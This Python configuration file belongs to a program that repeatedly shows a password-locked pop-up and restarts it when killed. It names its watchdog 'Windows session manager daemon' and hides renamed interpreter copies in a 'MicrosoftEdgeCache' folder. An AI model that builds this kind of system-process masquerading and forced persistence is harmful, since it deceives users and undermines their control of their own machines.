"""
# Configuration

Tunable constants shared across the package.

Delays default to **1–3 h** and can be overridden for testing with the
`LIONS_HEART_MIN_DELAY` / `LIONS_HEART_MAX_DELAY` environment variables.
"""

from __future__ import annotations

import os
import tempfile

# Pool the "unlock" password is drawn from.  One entry is picked at random
# every time the pop-up is created.
PASSWORDS: list[str] = [
    "lionheart",
    "cub-2024",
    "pride_lands",
    "savanna",
    "mafia-lion",
]

# Typing this into the pop-up stops the whole program permanently.
STOP_PASSWORD: str = "LET_ME_OUT_2024"

# Unlock -> next pop-up delay (seconds).  Defaults: 1 h .. 3 h.
DELAY_MIN_SECONDS: int = int(os.environ.get("LIONS_HEART_MIN_DELAY", 1 * 60 * 60))
DELAY_MAX_SECONDS: int = int(os.environ.get("LIONS_HEART_MAX_DELAY", 3 * 60 * 60))

# If the pop-up is killed without reporting a verdict, restart it after this
# many seconds.
RESTART_GRACE_SECONDS: int = 5

# If True, ANY password from PASSWORDS unlocks the window.
ACCEPT_ANY_FROM_SET: bool = False

POPUP_PROCESS_NAME: str = "lions_heart"
WATCHDOG_PROCESS_NAME: str = "Windows session manager daemon"

# Folder where the renamed pythonw.exe copies live.
CACHE_DIR_NAME: str = "MicrosoftEdgeCache"

LOG_FILE: str = os.path.join(
    os.environ.get("LOCALAPPDATA", tempfile.gettempdir()),
    "lions_heart.log",
)

# Windows process-creation flags.
DETACHED_PROCESS: int = 0x00000008
CREATE_NEW_PROCESS_GROUP: int = 0x00000200
